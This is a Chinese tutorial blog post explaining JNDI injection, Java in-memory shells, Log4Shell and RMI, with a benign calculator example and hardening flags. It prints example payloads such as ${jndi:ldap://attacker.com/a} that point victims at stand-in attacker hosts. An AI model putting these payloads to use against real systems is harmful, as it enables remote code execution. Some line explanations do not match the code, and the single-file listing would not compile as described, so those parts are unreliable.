---
title: "JNDI注入"
date: 2025-11-21T12:44:00+08:00
draft: false 
categories: ["网络安全"]
tags: ["Java", "JNDI注入", "Web安全", "基础编程", "网络安全"]
---
# JNDI注入

## **什么是内存马**

 内存马是一段仅驻留在服务器内存中的恶意代码，它不写入磁盘文件，因此传统基于文件扫描的杀毒软件很难发现。在 Java 里，它通常表现为一个被动态加载到 JVM 内存中的恶意类，可以接收远程指令、执行任意命令或窃取敏感数据。

## **内存马常见类别**

 • Servlet 型：通过篡改或新增 Servlet、Filter、Listener 实现流量拦截与命令执行。
 • Agent 型：利用 Java Instrumentation API 在运行时修改已有类的字节码，植入后门。
 • 动态代理/反射型：通过 Proxy、InvocationHandler 或反射机制把恶意逻辑挂接到正常业务流程中。
 • 代码执行型：借助脚本引擎（如 Nashorn、Groovy）把恶意脚本直接加载到内存并执行

## **为什么会存在内存马**

 根本原因在于 Java 的“动态性”：
 • 类可以在运行时从网络、数据库或其他非文件源加载；
 • 字节码可以被 Instrumentation API 在运行时修改；
 • 反射和动态代理允许在不改动源码的前提下改变程序行为。
 攻击者正是利用这些特性，把恶意代码“注入”到正在运行的 JVM 里，而不留下任何文件痕迹。

## **Java 架构如何助长内存马**

 • JVM 的类加载机制是“按需加载”，运行时可随时从任意来源读取字节码并定义成类；
 • 运行时数据区（堆、方法区等）对动态生成的类和对象没有额外限制；
 • “沙箱”模型只在早期 Applet 时代严格实施，现代服务器应用往往以全权模式运行，一旦获得 ClassLoader 或 Instrumentation 实例，就能突破信任边界。
 因此，只要攻击者拿到能够动态加载或修改字节码的入口（如反序列化漏洞、JNDI 注入、Groovy 脚本执行等），就能把恶意逻辑直接塞进内存，形成无文件驻留。

一句话总结：内存马的本质是“把恶意代码当成普通 Java 类一样加载到内存并执行”，它之所以能成为“无文件”，正是因为 Java 的类加载、字节码改写和反射机制允许在不落地文件的前提下完成整个攻击链。

## 一、什么是JNDI注入

**JNDI为什么会成为黑客的工具**

### 1.1 **一句话区分：**

 JNDI 注入是黑客把“资源查找”这把正经钥匙，拧成了撬锁的铁丝。

### 1.2 JNDI注入的核心到底是什么？

**核心只有一句话：**

> 攻击者能够**控制传给 JNDI lookup() 的字符串**，从而让受害者程序去加载并执行攻击者指定的恶意代码。

换成大白话： 程序本来应该只查“jdbc/myDS”这种安全的名字，结果你让我查“ldap://evil.com/badclass”，我就真的去 evil.com 下载并执行那个坏类——这就中招了。

#### **解释 lookup() ：**

1. JNDI 本身不是黑客发明的，它是 JavaEE 里用来“按名字找资源”的一套标准 API，比如找数据库、远程对象、LDAP 条目等，初衷是让开发更方便。
2. JNDI 注入则是黑客发现：
   • lookup() 的参数如果来自用户输入，就能被拼成恶意 URI（ldap://、rmi:// 等）；
   • 目标服务器会乖乖去请求攻击者控制的目录服务；
   • 返回的恶意 Reference 可触发远程类加载，最终在内存里执行任意代码。
3. 因此，它并不是为解决某种问题而设计的“安全行为”，而是开发人员在使用 JNDI 时，对 lookup 字符串缺乏严格校验，被黑客逆向利用形成的安全漏洞。

### 1.3 为什么JNDI会去加载远程的恶意类？原理是怎么样的？

关键在于 Java 的一个类：javax.naming.InitialContext 在 lookup 的时候，**默认信任并自动反序列化**某些协议返回的对象。

支持的危险协议（能加载远程代码的）主要有三个：

1. **RMI**（上面代码用的）
2. **LDAP**（最常见、最危险，Log4Shell 就是这个）
3. **CORBA**（已经基本废弃）

其中 LDAP 最可怕，因为 LDAP 服务器可以直接返回一个包含 **远程 class 文件 URL** 的对象，Java 会自动去下载并执行那个 class 中的 static 代码块或者构造函数。

流程图（Log4Shell 最典型）：

```
用户输入: ${jndi:ldap://evil.com/Exploit}
→ log4j 傻乎乎地把这行字符串交给 JNDI lookup
→ JNDI 去 evil.com 的 LDAP 服务问 "Exploit 这个名字对应什么对象？"
→ 恶意的 LDAP 服务器返回：这个对象是个 Java 类，类文件在 http://evil.com/Exploit.class
→ JVM 自动下载 Exploit.class 并实例化
→ Exploit.class 的 static {} 块或者构造函数里执行 Runtime.getRuntime().exec("calc.exe")
→ 服务器直接被弹计算器 / 挖矿 / 后门
```

### 1.4 什么是按名字找资源

#### 大白话解释

想象一下，你去图书馆借一本名为《哈利·波特与魔法石》的书：

1. **你提供名字**：你告诉图书管理员书名，就像在电脑中输入资源的名称一样。
2. **图书管理员查找目录**：图书管理员会查看图书馆的目录，找到这本书的编号和所在位置，就像电脑在内部查找资源的位置一样。
3. **图书管理员取书**：根据目录信息，图书管理员去书架上找到这本书，然后交给你，就像电脑从指定位置读取资源并提供给你一样。

#### 原理结合

在计算机中，**按名字找资源**的过程类似：

1. **资源命名**：每个资源（如文件、数据库连接、网络服务等）都有一个唯一的名称，就像每本书都有一个书名。
2. **建立目录**：操作系统或应用程序会维护一个资源目录，记录资源名称和实际位置的对应关系，就像图书馆的目录一样。
3. 查找资源
   - **你提供名称**：在程序中，你通过名称请求资源，就像告诉图书管理员书名。
   - **系统查找目录**：系统根据你提供的名称，在资源目录中查找对应的实际位置。
   - **获取资源**：系统从找到的位置读取资源，并提供给程序使用。

#### 简单例子说明

- ##### **文件资源**：你在电脑上打开一个名为 `report.docx` 的文件，操作系统会根据文件名在硬盘上找到对应的文件内容。

- **数据库连接**：在程序中，你使用名称 `jdbc/MyDatabase` 获取数据库连接，JNDI 会查找目录，找到实际的数据库连接信息并返回给你。

##### **再次打个最简单的比喻：**

​        你去星巴克点咖啡，你不会直接冲进后厨找咖啡豆吧？你会对服务员说：“我要一杯美式”。 服务员（前台）就去后厨给你拿——这个“服务员+菜单”就是 JNDI。

在Java世界里，很多资源都有名字：

- 数据库连接池叫 “jdbc/myDS”
- 队列叫 “jms/myQueue”
- 远程对象（RMI）叫 “rmi://ip:1099/AddService”

程序只需要说：“给我 jdbc/myDS 这个东西”，JNDI 就负责帮你去找、创建、返回真正的对象。

所以 JNDI 本来是**为了让程序更灵活、更容易配置**而生的，程序员不用硬编码 IP、端口、驱动类名，只要改配置文件就行。

##### 总结

**按名字找资源**的核心是：

- **命名**：给资源起一个唯一的名字。
- **目录**：建立资源名称与实际位置的映射关系。
- **查找**：根据名称在目录中查找，获取资源。

## 二、什么是LDAP和RMI协议

ldap:// 和 rmi:// 就像 http:// 一样，都是一串“协议前缀”，用来告诉程序“接下来要用哪种协议去访问资源”。

1. ldap://
    相当于“目录查询专用浏览器”。
    例：ldap://192.168.1.100:389/dc=company,dc=com
    意思是“用 LDAP 协议去 192.168.1.100 这台目录服务器的 389 端口，查找 company.com 这个范围下的条目”。
    它不传网页，而是传“用户、部门、权限”这类结构化信息。
2. rmi://
    相当于“远程对象调用专线”。
    例：rmi://192.168.1.200:1099/Calculator
    意思是“用 RMI 协议去 192.168.1.200 的 1099 端口，调用名叫 Calculator 的远程对象”。
    它不传网页，而是让本地程序像调用本地方法一样执行远程对象的方法。

与 HTTP 的异同

- 相同：都用“协议://地址:端口/路径”的格式，都是通过网络获取东西。
- 不同：
  – HTTP 拿的是网页、图片、JSON 等数据；
  – LDAP 拿的是目录条目（用户、组、权限）；
  – RMI 拿的是可远程调用的对象句柄。

## 三、远程加法计算器例子

我们用“远程加法计算器”这个例子，把 RMI 拆成三步：

1. 定义“能远程调用的功能”——就像贴出一份“我能干啥”的告示；
2. 服务器把真正的计算方法挂在网上；
3. 客户端拿着告示去远程找服务器算结果。

### 第一步：写一张“告示”（接口）

```java
// 告示：只要谁能提供 add 方法，就可以远程调用
public interface AddServerIntf extends java.rmi.Remote {
    // 接收两个 double，返回和；可能抛 RemoteException
    double add(double a, double b) throws java.rmi.RemoteException;
}
```

- 第 1 行：`interface` 就是贴一张“告示”，告诉别人“我能干啥”。
- 第 2 行：`extends java.rmi.Remote` 意思是“这张告示是允许远程调用的”。
- 第 3 行：`double add(...)` 告诉别人“我能把两个小数相加，并把结果返回”。
- `throws RemoteException`：远程调用可能出网络问题，所以提前说“如果出错，我会抛异常”。

------

### 第二步：服务器（真正的计算器）

```java
// 真正的加法器
public class AddServerImpl extends java.rmi.server.UnicastRemoteObject 
        implements AddServerIntf {

    // 必须有默认构造函数，且抛 RemoteException
    protected AddServerImpl() throws java.rmi.RemoteException {
        super();
    }

    // 实现告示里的 add 方法
    @Override
    public double add(double a, double b) throws java.rmi.RemoteException {
        System.out.println("服务器正在计算 " + a + " + " + b);
        return a + b;
    }

    public static void main(String[] args) {
        try {
            // 1. 启动 RMI registry（相当于一个“黄页”服务）
            java.rmi.registry.LocateRegistry.createRegistry(1099);
            // 2. 把我们的加法器实例注册到黄页，取名叫 "AddService"
            AddServerIntf stub = new AddServerImpl();
            java.rmi.Naming.rebind("AddService", stub);
            System.out.println("服务器已启动，等待客户端调用...");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

- 第 1 行：`class AddServerImpl` 就是“真正的计算器”。
- 第 2 行：`extends UnicastRemoteObject` 意思是“我把自己变成能远程访问的对象”。
- 第 3 行：`implements AddServerIntf` 意思是“我按照告示上的内容，把真正的加法逻辑写在这里”。
- 第 4-6 行：构造方法，告诉 JVM“我需要远程能力，所以调用 super()”。
- 第 7-9 行：真正的加法逻辑，跟普通 Java 方法一样，只是多抛了一个 RemoteException。
- 第 10-14 行：`main`方法就是“把计算器挂到网上”。
  - 第 11 行：先 new 一个计算器实例。
  - 第 12 行：`Naming.rebind(...)` 相当于把计算器注册到“电话簿”（RMI Registry），名字叫 `AddServer`，别人只要查这个名字就能找到它。
  - 第 13 行：打印“服务已启动”，表示挂好了。

------

### 第三步：客户端（远程调用者）

```java
public class AddClient {
    public static void main(String[] args) {
        try {
            // 1. 找到服务器的黄页（假设服务器在 192.168.1.100）
            String url = "rmi://192.168.1.100:1099/AddService";
            // 2. 从黄页里取出名为 "AddService" 的远程对象
            AddServerIntf stub = (AddServerIntf) java.rmi.Naming.lookup(url);
            // 3. 像调用本地方法一样调用远程方法
            double result = stub.add(3.5, 4.2);
            System.out.println("远程计算结果: " + result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

- 第 1-2 行：`main` 方法就是“远程调用者”。
- 第 3 行：`Naming.lookup(...)` 相当于去“电话簿”里查名字叫 `AddServer` 的计算器。
- 第 4 行：拿到计算器后，直接调用 `add(3.0, 5.0)`，就像调用本地方法一样。
- 第 5 行：打印结果，看到 `3 + 5 = 8.0`。

------

一句话总结

1. 告示（接口）：告诉别人“我能远程加法”。
2. 服务器：把真正的加法器挂到网上。
3. 客户端：去网上查名字，拿到计算器，直接调用，就像本地一样。

**原理**：

- `lookup` 就是去黄页里按名字找“谁能提供 add”；
- 找到后返回一个“代理”（stub），它看起来像本地对象，实际内部会把参数打包、发到网络、等服务器返回结果；
- 整个过程对程序员透明，就像调用本地方法一样。

------

一句话总结
 RMI 就是“把本地对象搬到网上，让别人像调用本地方法一样调用远程方法”，中间的打包、发包、解包、回包都由 RMI 框架自动完成。

## 四、补充：

## 4.1 为什么这么好的技术会被黑客利用？时间线简单说一下

2015-2016 年左右，安全研究员就发现 JNDI + LDAP/RMI 可以远程加载代码

2016 年 Jenkins、WebLogic 等很多知名中间件被爆 JNDI 注入漏洞（就是用户能控制 lookup 的名字）

2021年12月 Log4Shell（log4j2）彻底引爆全世界，因为几乎所有 Java 项目都用了 log4j，而且日志会直接打印用户输入，等于用户一句话就能触发 JNDI 注入

到现在（2025年），JNDI 注入仍然是 Java 应用中最常见的严重漏洞之一。

## 4.2  黑客到底是怎么实际利用的？（真实攻击链）

**1.找到一个能控制 JNDI lookup 参数的地方（常见入口）：**

- 日志（Log4Shell）
- HTTP Header（如 User-Agent、X-Forwarded-For）
- URL 参数、JSON 参数
- WebLogic 的 T3/IIOP 协议、各种反序列化点

**2.构造 payload（最经典的）：**

```
${jndi:ldap://attacker.com/a}
${jndi:rmi://attacker.com/a}
```

**3.攻击者在自己的 VPS 上**：

- 启动恶意 LDAP 服务器（用 marshalsec、rogue-jndi 等工具，几行命令就行）
- 放一个恶意的 Exploit.class（里面执行 calc.exe 或反弹 shell）

4.受害者服务器一收到 payload → 自动去下载并执行 → 中招

## 4.3 几个关键点（非常重要！）

| 你可能忽略的点                                               | 解释                                                       |
| ------------------------------------------------------------ | ---------------------------------------------------------- |
| 即使你没有用 log4j，只要程序里有 `new InitialContext().lookup(userInput)` 就可能中招 | 很多老项目、各种框架都自己写了 JNDI 查询                   |
| 默认情况下，JDK 8u191 之后已经禁掉了远程 class 加载（com.sun.jndi.ldap.object.trustURLCodebase=false） | 但很多老系统还是 JDK8u181 之前，或者手动把这个参数改回来了 |
| RMI 也可以触发（上面代码就是），只是没有 LDAP 那么方便       | 2023-2024 年还有很多 RMI 注入漏洞被挖                      |
| 即使禁掉了远程代码加载，仍然可能有反序列化 Gadget 链         | YSOSerial 的 gadget 可以直接在本地触发危险操作             |
| Spring、Jackson、Fastjson 等反序列化漏洞很多时候也会间接触发 JNDI | 它们在反序列化时会走到 JNDI lookup                         |

## 总结（给小白的防JNDI注入口诀）

1. **永远不要把用户输入直接交给 InitialContext.lookup() 或 Naming.lookup()**

2. 如果一定要用，设置以下 JVM 参数（强烈推荐）：

   ```
   -Dcom.sun.jndi.rmi.object.trustURLCodebase=false
   -Dcom.sun.jndi.ldap.object.trustURLCodebase=false
   -Dcom.sun.jndi.cosnaming.object.trustURLCodebase=false
   ```

  3.升级到最新 JDK（JDK 11+、17+ 默认已经禁掉远程加载）

  4.用 WAF 或日志监控拦截 ${jndi: 这类特征

## 完整源码

```java
// ===============================================================
// 文件名：AddServerWithFullComments.java
// 作用：完整的 Java RMI + JNDI 示例，带超级详细的逐行中文注释
// 适合：Java 小白 + 刚学网络安全的同学
// 警告：这个代码本身是教学用的，但演示了 JNDI 注入的原理！
//       生产环境绝对不要把用户输入直接给 lookup() 用！！！
// ===============================================================

import java.rmi.Remote;                      // Remote 是所有远程接口必须继承的标记接口
import java.rmi.RemoteException;           // 远程方法必须抛出的异常
import java.rmi.server.UnicastRemoteObject; // 实现远程对象时要继承的父类
import java.rmi.registry.LocateRegistry;    // 用于创建本地 RMI 注册中心（黄页）
import java.rmi.Naming;                     // 用来绑定和查找远程对象（旧 API，但经典）

// 第一部分：远程接口（相当于“服务合同、告示”）
// 只要谁实现了这个接口并注册，就允许别人远程调用 add 方法
public interface AddServerIntf extends Remote {  // 必须继承 java.rmi.Remote
    // 定义一个远程方法：接收两个 double，返回它们的和
    // 所有远程方法都必须声明 throws RemoteException（因为网络可能出问题）
    double add(double a, double b) throws RemoteException;
}

// 第二部分：远程对象的真正实现类
public class AddServerImpl extends UnicastRemoteObject 
        implements AddServerIntf {   // 必须同时继承 UnicastRemoteObject 并实现上面的接口

    // 必须提供一个（可以是 protected）构造函数，并且要抛 RemoteException
    // 为什么？因为 UnicastRemoteObject 的构造函数会抛这个异常
    protected AddServerImpl() throws RemoteException {
        super();                // 调用父类 UnicastRemoteObject 的无参构造函数
        // super() 这行可以省略，但写出来更清晰
    }

    // 真正实现加法逻辑
    @Override
    public double add(double a, double b) throws RemoteException {
        System.out.println("【服务器端】正在计算 " + a + " + " + b);
        // 这里可以写任意复杂逻辑，客户端调用时就会在服务器机器上执行
        return a + b;
    }

    // ==================== 服务器启动入口 ====================
    public static void main(String[] args) {
        try {
            // 第1步：在本机 1099 端口启动一个 RMI 注册中心（相当于“电话黄页”）
            // 如果这行不执行，客户端就找不到服务（会报 Connection refused）
            LocateRegistry.createRegistry(1099);
            System.out.println("RMI 注册中心已在 1099 端口启动成功");

            // 第2步：创建远程对象实例（这一步会自动生成一个“stub”存根对象）
            // stub 是客户端真正拿到的“代理”，它负责把方法调用通过网络发给服务器
            AddServerImpl impl = new AddServerImpl();

            // 第3步：把这个服务用名字 "AddService" 绑定到注册中心
            // 绑定后，别人就可以通过名字找到它
            // rebind 的意思是：如果名字已存在就覆盖（bind 是如果存在就报错）
            Naming.rebind("AddService", impl);
            // 完整的绑定名字其实是：rmi://localhost:1099/AddService
            // 但在本机可以省略 ip 和端口

            System.out.println("加法服务已成功注册，名字 = AddService");
            System.out.println("服务器已就绪，等待客户端远程调用...");
            System.out.println("按 Ctrl+C 可以停止服务器");

        } catch (Exception e) {
            // 任何异常都打印出来（启动失败常见原因是端口被占用）
            System.err.println("服务器启动失败！");
            e.printStackTrace();
        }
    }
}

// ==================== 客户端代码（写在同一个文件里方便学习）===================
class AddClient {
    // 客户端只需要一个 main 方法，不需要实现任何远程接口
    public static void main(String[] args) {
        try {
            // 第1步：拼出远程服务的完整 JNDI 名字
            // 格式：rmi://ip:端口/服务名
            // 如果服务器和客户端在同一台机器，可以写 rmi:///AddService 或 rmi://127.0.0.1/AddService
            String url = "rmi://127.0.0.1:1099/AddService";
            // 注意：这里如果把 url 换成用户输入，就是经典的 JNDI 注入点了！！！

            System.out.println("客户端正在连接服务器：" + url);

            // 第2步：关键的 JNDI lookup 操作（最容易出安全问题的点）
            // 从注册中心查找名为 "AddService" 的远程对象，返回的是 stub（代理）
            // 如果这里 url 是用户可控的，攻击者就可以让你去 rmi://evil.com/BadObj
            AddServerIntf stub = (AddServerIntf) Naming.lookup(url);

            System.out.println("成功拿到远程对象的代理（stub）");

            // 第3步：像调用本地方法一样调用远程方法
            // 实际上底层会通过网络把参数序列化发给服务器，服务器计算完再返回
            double result = stub.add(13.5, 28.7);

            // 结果是在服务器算的，但打印是在客户端
            System.out.println("【客户端】远程计算结果：13.5 + 28.7 = " + result);

            // 再测一次
            System.out.println("再来一次：stub.add(100, 200) = " + stub.add(100, 200));

        } catch (Exception e) {
            System.err.println("客户端调用失败！");
            // 常见原因：服务器没开、ip写错、防火墙、名字不对、没启动 registry
            e.printStackTrace();
        }
    }
}
```

### 使用方法（小白专用步骤）：

1. 把上面所有代码复制到一个新文件，命名为 AddServerWithFullComments.java
2. 先用 javac AddServerWithFullComments.java 编译（会生成很多 .class 文件）
3. 开两个终端：
   - 终端1（服务器）：java AddServerImpl
   - 终端2（客户端）：java AddClient
4. 你就会看到服务器打印计算日志，客户端打印结果

这样你就把“JNDI 注入原理示例 + 超详细逐行注释”完整保存在一个文件里了，随时可以拿出来复习～

有需要我再给你拆成三个独立文件（接口、服务器、客户端）或者加上安全加固版的代码也可以随时说